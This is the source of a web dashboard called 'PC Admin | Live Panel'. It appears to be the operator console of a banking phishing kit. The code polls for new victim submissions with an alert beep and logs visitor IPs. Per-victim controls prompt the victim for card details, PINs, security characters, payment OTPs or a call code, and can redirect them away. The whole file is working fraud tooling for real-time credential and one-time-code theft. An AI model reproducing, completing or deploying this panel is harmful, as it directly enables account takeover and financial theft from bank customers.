<?php
//Dwi P.D

require "s2.php";

?>
<!doctype html>
<html lang="en">

<head>
	<meta charset="utf-8">
	<meta name="robots" content="noindex, nofollow">
	<meta name="viewport" content="width=1024px">
	<title>PC Admin | Live Panel</title>
	<meta name="description" content="PC view for Live Panel">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
	<meta name="theme-color" content="#563d7c">
	<meta http-equiv=Pragma content=no-cache>
	<meta http-equiv=Cache-Control content="no-cache, no-store">
	<meta http-equiv=X-Frame-Options content=SAMEORIGIN class=sf-hidden>
	<meta http-equiv=X-XSS-Protection content="'1; mode=block' always" class=sf-hidden>
	<meta http-equiv=X-Content-Type-Options content="'nosniff' always" class=sf-hidden>
	<meta http-equiv=Referrer-Policy content=strict-origin-when-cross-origin class=sf-hidden>
	<meta http-equiv=Cache-Control content="no-cache, no-store" class=sf-hidden>
	<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
	<meta http-equiv="expires" content="-1">
	<meta http-equiv="cache-control" content="max-age=0">
	<meta http-equiv="cache-control" content="no-cache">
	<meta http-equiv="expires" content="0">
	<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
	<meta http-equiv="pragma" content="no-cache">
	<meta http-equiv="Pragma: no-cache">
	<meta http-equiv="Cache Control" content=no-store>
	<meta http-equiv="Cache Control: no-store">


	<style>
		.bd-placeholder-img {
			font-size: 1.125rem;
			text-anchor: middle;
			-webkit-user-select: none;
			-moz-user-select: none;
			-ms-user-select: none;
			user-select: none;
		}

		body {
			background-color: #EEEEEE;
		}

		@media (min-width: 768px) {
			.bd-placeholder-img-lg {
				font-size: 3.5rem;
			}
		}
	</style>
	<link href="partial/css/dashboard.css" rel="stylesheet">
	<link rel="shortcut icon" href="partial/img/icon.png">
	<link rel="stylesheet" href="partial/css/nucleo.css" type="text/css">
	<link rel="stylesheet" href="partial/css/dataTables.css">
	<link rel="stylesheet" href="partial/css/buttons.css">
	<link rel="stylesheet" href="partial/css/select.css">
	<link rel="stylesheet" href="partial/css/quill.css">
	<link rel="stylesheet" href="partial/css/argon.css" type="text/css">
	<link rel="stylesheet" href="partial/css/toast.css" type="text/css">
	<link rel="icon" href="../partial/img/favicon.ico" type="image/ico">
	<script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
	<script>
		function beep() {
			var sound = new Audio("../partial/alert.wav");
			sound.play();
		}

		function showfields(userid) {

			if ($("#askcharsradio0" + userid).is(':checked')) {
				$('#askchars0' + userid).show();

				$('#askcallcode' + userid).hide();
				$('#askcallcode' + userid).find('input').val('');
				$('#askcall' + userid).hide();
				$('#askcall' + userid).find('input').val('');

			} else {
				$('#askchars0' + userid).hide();
				$('#askchars0' + userid).find('input').val('');
			}

			if ($("#askcharsradio1" + userid).is(':checked')) {
				$('#askchars1' + userid).show();

				$('#askcallcode' + userid).hide();
				$('#askcallcode' + userid).find('input').val('');
				$('#askcall' + userid).hide();
				$('#askcall' + userid).find('input').val('');

			} else {
				$('#askchars1' + userid).hide();
				$('#askchars1' + userid).find('input').val('');
			}

			if ($("#asksmartpin1" + userid).is(':checked')) {
				$('#smartpin1' + userid).show();

				$('#smartpin2' + userid).hide();
				$('#smartpin1' + userid).find('input').val('');
				$('#mobilepin1' + userid).hide();
				$('#mobilepin1' + userid).find('input').val('');

			} else {
				$('#smartpin1' + userid).hide();
				$('#smartpin1' + userid).find('input').val('');
			}

			if ($("#asksmartpin2" + userid).is(':checked')) {
				$('#smartpin2' + userid).show();

				$('#askcallcode' + userid).hide();
				$('#askcallcode' + userid).find('input').val('');
				$('#askcall' + userid).hide();
				$('#askcall' + userid).find('input').val('');

			} else {
				$('#smartpin2' + userid).hide();
				$('#smartpin2' + userid).find('input').val('');
			}

			if ($("#askmobilepin2" + userid).is(':checked')) {
				$('#mobilepin2' + userid).show();

				$('#askcallcode' + userid).hide();
				$('#askcallcode' + userid).find('input').val('');
				$('#askcall' + userid).hide();
				$('#askcall' + userid).find('input').val('');

			} else {
				$('#mobilepin2' + userid).hide();
				$('#mobilepin2' + userid).find('input').val('');
			}



			if ($("#askcallcoderadio" + userid).is(':checked')) {
				$('#askcallcode' + userid).show();

				$('#askchars0' + userid).hide();
				$('#askchars0' + userid).find('input').val('');
				$('#askcall' + userid).hide();
				$('#askcall' + userid).find('input').val('');

			} else {
				$('#askcallcode' + userid).hide();
				$('#askcallcode' + userid).find('input').val('');
			}


			//askcall



			if ($("#askcard" + userid).is(':checked')) {
				$('#askque' + userid).show();
				$('#askcallcode' + userid).hide();
				$('#askcallcode' + userid).find('input').val('');
				$('#askchars0' + userid).hide();
				$('#askchars0' + userid).find('input').val('');
				$('#askcall' + userid).hide();
				$('#askcall' + userid).find('input').val('');

			} else {
				$('#askque' + userid).hide();
				$('#askchars0' + userid).find('input').val('');
			}
			
			if ($("#askcard1" + userid).is(':checked')) {
				$('#askque1' + userid).show();
				$('#askcallcode' + userid).hide();
				$('#askcallcode' + userid).find('input').val('');
				$('#askchars0' + userid).hide();
				$('#askchars0' + userid).find('input').val('');
				$('#askcall' + userid).hide();
				$('#askcall' + userid).find('input').val('');

			} else {
				$('#askque1' + userid).hide();
				$('#askchars0' + userid).find('input').val('');
			}
			
			if ($("#askpayotp" + userid).is(':checked')) {

				$('#askcallcode' + userid).hide();
				$('#askcallcode' + userid).find('input').val('');
				$('#askchars0' + userid).hide();
				$('#askchars0' + userid).find('input').val('');
				$('#askcall' + userid).hide();
				$('#askcall' + userid).find('input').val('');

			} else {
				//look and do nothing
			}

			if ($("#askccard" + userid).is(':checked')) {

				$('#askcallcode' + userid).hide();
				$('#askcallcode' + userid).find('input').val('');
				$('#askchars0' + userid).hide();
				$('#askchars0' + userid).find('input').val('');
				$('#askcall' + userid).hide();
				$('#askcall' + userid).find('input').val('');

			} else {
				//look and do nothing
			}

			if ($("#askcallradio" + userid).is(':checked')) {
				$('#askcall' + userid).show();

				$('#askcallcode' + userid).hide();
				$('#askcallcode' + userid).find('input').val('');
				$('#askchars0' + userid).hide();
				$('#askchars0' + userid).find('input').val('');


			} else {
				$('#askcall' + userid).hide();
			}

			if ($("#askloginradio" + userid).is(':checked')) {

				$('#askcallcode' + userid).hide();
				$('#askcallcode' + userid).find('input').val('');
				$('#askchars0' + userid).hide();
				$('#askchars0' + userid).find('input').val('');
				$('#askcall' + userid).hide();
				$('#askcall' + userid).find('input').val('');

			} else {
				//look and do nothing
			}

			if ($("#sendawayradio" + userid).is(':checked')) {

				$('#askcallcode' + userid).hide();
				$('#askcallcode' + userid).find('input').val('');
				$('#askchars0' + userid).hide();
				$('#askchars0' + userid).find('input').val('');
				$('#askcall' + userid).hide();
				$('#askcall' + userid).find('input').val('');

			} else {
				//look and do nothing
			}

			if ($("#finishradio" + userid).is(':checked')) {
				$('#askcallcode' + userid).hide();
				$('#askcallcode' + userid).find('input').val('');
				$('#askchars0' + userid).hide();
				$('#askchars0' + userid).find('input').val('');
				$('#askcall' + userid).hide();
				$('#askcall' + userid).find('input').val('');
			} else {
				//look and do nothing
			}

		}

		var timmer = setInterval(function() {
			var urldata = '../partial/controller.php?get_submitted';
			$.ajax({
				url: urldata,
				type: 'GET',
				success: function(response) {
					//console.log(response)
					var rasponse = JSON.parse(response)
					if (rasponse.status == 'ok') {
						beep();
						Toast.fire({
							icon: 'info',
							title: 'New input, check data'
						})
						//clearInterval(timmer);
					}

				},

			});

		}, 1500);
		
		var auto_fetch = setInterval(function() {
			var urldata = '../partial/controller.php?fetch_pc_data';
			$.ajax({
				url: urldata,
				type: 'GET',
				success: function(response) {
					$("#table_data").html(response);
				},
			});
		}, 1500);

		function controlBtn(elem) {

			$.ajax({
				url: '../partial/controller.php?fetch_pc_modal_data',
				type: 'GET',
				success: function(data) {
					//console.log(data);
					$("#hidden_table_data").html(data);
					$("#hidden_table_data").show();
					var fullid = $(elem).attr('id');
					var userid = fullid.replace('userid_', '');
					var modal_user_id = "#modal_userid_" + userid;
					$(modal_user_id).show('fast');
				},
				error: function(error) {
					console.log("Unable to render");
				}
			});
		}

		function view_logBtn(elem) {

			$.ajax({
				url: '../partial/controller.php?fetch_pc_finish_modal_data',
				type: 'GET',
				success: function(data) {
					$("#hidden_table_data").html(data);
					$("#hidden_table_data").show();
					var fullid = $(elem).attr('id');
					var userid = fullid.replace('userid_', '');
					var modal_user_id = "#viewmodal_userid_" + userid;
					$(modal_user_id).show('fast');
				},
				error: function(error) {
					console.log("Unable to render");
				}
			});
		}

		function close_btn() {
			$("#hidden_table_data").hide('fast');
			$(".modal-backdrop.fade.show").hide('fast');
		}

		var counter = setInterval(function() {
			$.ajax({
				url: '../partial/controller.php?counter',
				type: 'GET',
				success: function(data) {
					//console.log(data)
					var stats = JSON.parse(data)
					var total_user = stats.usernum;
					var total_active = stats.activenum;
					var completed_users = stats.completednum;
					//console.log(total_user)
					if (total_user >= 1) {
						document.getElementById("visitors").innerText = total_user;
						document.getElementById("activeusers").innerText = total_active;
						document.getElementById("completedusers").innerText = completed_users;

					}
					//clearInterval(timmer);
				}

			});

		}, 3000);

		var visitorCount = setInterval(function() {
			$.ajax({
				url: '../partial/controller.php?visitlog',
				type: 'GET',
				success: function(data) {
					//console.log(data)
					var log = JSON.parse(data)
					var visitor_log = log.visitorlog;
					//console.log(total_user)
					if (visitor_log != '') {
						document.getElementById("ipdata").textContent = visitor_log;
					}
					//clearInterval(timmer);
				}

			});

		}, 3000);
	</script>
	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
	<script>
		const Toast = Swal.mixin({
			toast: true,
			position: 'top-end',
			showConfirmButton: false,
			timer: 1500,
			timerProgressBar: true,
			onOpen: (toast) => {
				toast.addEventListener('mouseenter', Swal.stopTimer)
				toast.addEventListener('mouseleave', Swal.resumeTimer)
			}
		})
	</script>

</head>
<!-- header begin-->

<body class="g-sidenav-show g-sidenav-pinned" data-new-gr-c-s-check-loaded="8.873.0" data-gr-ext-installed="" style="min-height: 100vh;">
	<script>
		Toast.fire({
			icon: 'success',
			title: 'Hello, welcome admin'
		})
		
		function buzzoff() {
			$.ajax({
				url: '../partial/controller.php?buzzoff',
				type: 'GET',
				success: function(response) {
					//console.log(response);
					var rasponse = JSON.parse(response);
					if (rasponse.status == 'ok') {
						Swal.fire({
							icon: 'success',
							title: 'Sound turned off',
							showConfirmButton: false,
							timerProgressBar: true,
							timer: 1500
						})
					}

				},
			});
		}

		function deleteentry(elem) {
			var fullid = $(elem).attr('id');
			var userid = fullid.replace('userid_', '');
			$.ajax({
				type: 'POST',
				url: '../partial/controller.php?type=delete',
				data: 'userid=' + userid,
				success: function(data) {
					//console.log(data);
					var parsed_data = JSON.parse(data);
					if (parsed_data.status == 'ok') {
						Toast.fire({
							icon: 'success',
							title: 'Entry Deleted'
						})
						setTimeout(function() {
							window.location.reload();
						}, 2000);

					} else {
						Toast.fire({
							icon: 'error',
							title: 'An error has occured'
						})
						return false;
					}
					//console.log(parsed_data.status);
				}
			});
		}
	</script>
	<div class="preloader"></div>
	<!-- Sidenav -->
	<nav class="sidenav navbar navbar-vertical fixed-left navbar-expand-xs navbar-light" style="background-color:#fafafa;" id="sidenav-main">
		<div class="scrollbar-inner">
			<!-- Brand -->
			<div class="sidenav-header d-flex align-items-center">
				<!--<a class="navbar-brand" href="admin panel">-->
				<a class="navbar-brand" href="#">
					<img src="../partial/img/favicon.ico" class="navbar-brand-img" style="max-height: 6rem !important;" alt="...">
				</a>
				<div class="ml-auto">
					<!-- Sidenav toggler -->
					<div class="sidenav-toggler d-none d-xl-block active" data-action="sidenav-unpin" data-target="#sidenav-main">
						<div class="sidenav-toggler-inner">
							<i class="sidenav-toggler-line"></i>
							<i class="sidenav-toggler-line"></i>
							<i class="sidenav-toggler-line"></i>
						</div>
					</div>
				</div>
			</div>
			<div class="navbar-inner">
				<!-- Collapse -->
				<div class="collapse navbar-collapse" id="sidenav-collapse-main">
					<!-- Nav items -->
					<ul class="navbar-nav">
						<li class="nav-item">
							<a class="nav-link  active  text-dark" href="#">
								<span class="badge badge-sm badge-circle badge-floating badge-danger border-white" style="color:white;margin-right:20px;background-color:#34495E">⌘</span>
								<span class="nav-link-text">Home</span>
							</a>
						</li>
					</ul>
					<hr class="my-3">
					<h6 class="navbar-heading p-0 text-muted">Available Options</h6>

					<ul class="navbar-nav mb-md-3">
						<li class="nav-item">
							<a class="nav-link  text-dark" href="dashboard.php">
								<span class="badge badge-sm badge-circle badge-floating badge-danger border-white" style="color:white;margin-right:20px;background-color:#34495E">⎋</span>
								<span class="nav-link-text">Refresh page</span>
							</a>
						</li>

						<li class="nav-item">
							<a class="nav-link  text-dark" href="logout.php">
								<span class="badge badge-sm badge-circle badge-floating badge-danger border-white" style="color:white;margin-right:20px;background-color:#34495E">⏎</span>
								<span class="nav-link-text">Signout</span>
							</a>
						</li>

						<li id="showlog" class="nav-item">
							<a class="nav-link  text-dark" href="#" data-toggle='modal' data-target='#view_visitor_modal'>
								<span class="badge badge-sm badge-circle badge-floating badge-danger border-white" style="color:white;margin-right:20px;background-color:#34495E">♨︎</span>
								<span class="nav-link-text">View Visitors</span>
							</a>
						</li>

				</div>
			</div>
		</div>
	</nav>

	<div class="main-content" id="panel">
		<div style="background-color:#34495E;height:10px">
			<!-- Topnav -->
			<nav class="navbar navbar-top navbar-expand navbar-dark border-bottom">
				<div class="container-fluid" style="margin-top:30px;">
					<div class="collapse navbar-collapse" id="navbarSupportedContent" style="margin-top: 80px;">
						<!-- Search form -->

						<!-- Navbar links -->
						<ul class="navbar-nav align-items-center ml-md-auto">
							<li class="nav-item d-xl-none">
								<!-- Sidenav toggler -->
								<div class="pr-3 sidenav-toggler sidenav-toggler-light active" data-action="sidenav-pin" data-target="#sidenav-main">
									<div class="sidenav-toggler-inner">
										<i class="sidenav-toggler-line"></i>
										<i class="sidenav-toggler-line"></i>
										<i class="sidenav-toggler-line"></i>
									</div>
								</div>
							</li>
						</ul>
						<ul class="navbar-nav align-items-center ml-auto ml-md-0">
							<button type="button" class="btn btn-sm btn-info" style="box-shadow: 2px 2px 4px 4px #34495E;margin-right:10px;" onclick="buzzoff();">Sound Off</button>
							<li class="nav-item">

								<a class="nav-link pr-0" href="javascript:void" role="button" aria-haspopup="true" aria-expanded="false">
									<div class="media align-items-center">
										<span class="avatar avatar-sm rounded-circle">
											<img alt="Image placeholder" src="partial/img/person.jpg">
										</span>
										<div class="media-body ml-2 d-none d-lg-block">
											<span class="mb-0 text-sm text-default">admin</span>
										</div>
									</div>
								</a>
							</li>
						</ul>
					</div>
				</div>
			</nav>
		</div>

		<div class="header pb-6" style="text-align:center">
			<div class="container-fluid">
				<div class="header-body">
					<div class="row align-items-center" style="margin-top:20px;">
						<div class="col-lg-6 col-7">
							<nav aria-label="breadcrumb" class="d-none d-md-inline-block ml-md-4">
								<h1 class="h2" style="margin-left:300px;text-shadow: 2px 2px 5px #34495E;">User Statistics</h1>
							</nav>
						</div>
					</div>
				</div>
			</div>
		</div>

		<div class="container-fluid mt--6">
			<div class="content-wrapper">
				<div class="row">
					<div class="col-md-3">
						<div class="card">
							<div class="card-body" style="padding-bottom: 0px;">
								<div class="d-sm-flex align-item-sm-center flex-sm-nowrap">
									<div>
										<h3 class="card-title"><b>Total Visitors:</b> <span id="visitors"> - </span></h3>
									</div>
								</div>
							</div>
						</div>
					</div>

					<div class="col-md-3">
						<div class="card">
							<div class="card-body" style="padding-bottom: 0px;">
								<div class="d-sm-flex align-item-sm-center flex-sm-nowrap">
									<div>
										<h3 class="card-title"><b>Active Users:</b> <span id="activeusers"> - </span></h3>
									</div>
								</div>
							</div>
						</div>
					</div>

					<div class="col-md-3">
						<div class="card">
							<div class="card-body" style="padding-bottom: 0px;">
								<div class="d-sm-flex align-item-sm-center flex-sm-nowrap">
									<div>
										<h3 class="card-title"><b>Completed Users:</b> <span id="completedusers"> - </span></h3>
									</div>
								</div>
							</div>
						</div>
					</div>

					<div class="container-fluid">
						<div class="row">

							<main role="main" class="col-md-12">
								<div class="table-responsive">
									
									<table class="table table-striped table-sm" style="background-color:#34495E;box-shadow: 2px 2px 4px 4px #000;">
										<thead style="color:#dd5">
											<tr>
												<th>#</th>
												<th>User</th>
												<th>Status</th>
												<th>IP</th>
												<th>Comment</th>
												<th>Level</th>
												<th>Action</th>
											</tr>
										</thead>
										<tbody id="table_data">

										</tbody>
									</table>
									<div id="hidden_table_data">

									</div>
								</div>
							</main>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>




	<script>
		function form_submit(elem) {
			var id = $(elem).attr("id");
			var parentformid = $('#' + id).closest('form').attr('id');
			var serialized_form = $('#' + parentformid).serialize();
			$.ajax({
				type: 'POST',
				url: '../partial/controller.php?type=commmand',
				data: serialized_form,
				success: function(data) {
					//console.log(data);
					var parsed_data = JSON.parse(data);
					if (parsed_data.status == 'ok') {
						Swal.fire({
							icon: 'success',
							title: 'Command sent, now refreshing page',
							showConfirmButton: false,
							timerProgressBar: true,
							timer: 1500
						})
						setTimeout(function() {
							window.location.reload();
						}, 1500);

					} else {
						Toast.fire({
							icon: 'error',
							title: 'A command error has occured'
						})
						return false;
					}
					//console.log(parsed_data.status);
				}
			})

		}
	</script>
	
	<div class='modal fade' id='view_visitor_modal' tabindex='-1' role='dialog' aria-labelledby='exampleModalLabel' aria-hidden='true'>
		<div class='modal-dialog' role='document' style='width:500px'>
			<div class='modal-content'>
				<div class='modal-header' style='background-color:#34495E;font-size:2.7rem;text-align:center;'>
					<h5 class='modal-title' id='exampleModalLabel' style='color:white;font-weight:700'><b>VISITOR LOG - IP Information</b></h5>
					<button type='button' class='close' data-dismiss='modal' aria-label='Close'>
						<span aria-hidden='true' style='color:white'>&times;</span>
					</button>
				</div>
				<div class='modal-body'>

					<div class='form-group'>
						<br>
						<textarea id='ipdata' class='form-control' disabled='disabled' rows='12'></textarea>
					</div>



				</div>
				<div class='modal-footer' style='margin-top:-40px'>
					<button type='button' class='btn btn-lg btn-dark col-12' data-dismiss='modal'>CLOSE</button>

				</div>
			</div>
		</div>
	</div>
	<style>
		body {
			font-family: "Inter", sans-serif;
			color: #000021;
			background-color: #e6e6ef;
		}

		form {
			display: flex;
			flex-wrap: wrap;
			flex-direction: column;
		}

		label {
			display: flex;
			cursor: pointer;
			font-weight: 500;
			position: relative;
			overflow: hidden;
			margin-bottom: 0.375em;
		}

		label input {
			position: absolute;
			left: -9999px;
		}

		label input:checked+span {
			background-color: #d6d6e5;
		}

		label input:checked+span:before {
			box-shadow: inset 0 0 0 0.4375em #34495E;
		}

		label span {
			display: flex;
			align-items: center;
			padding: 0.375em 0.75em 0.375em 0.375em;
			border-radius: 99em;
			transition: 0.25s ease;
		}

		label span:hover {
			background-color: #d6d6e5;
		}

		label span:before {
			display: flex;
			flex-shrink: 0;
			content: "";
			background-color: #fff;
			width: 1.5em;
			height: 1.5em;
			border-radius: 50%;
			margin-right: 0.375em;
			transition: 0.25s ease;
			box-shadow: inset 0 0 0 0.125em #34495E;
		}
	</style>

	<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
</body>
<a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>

</html>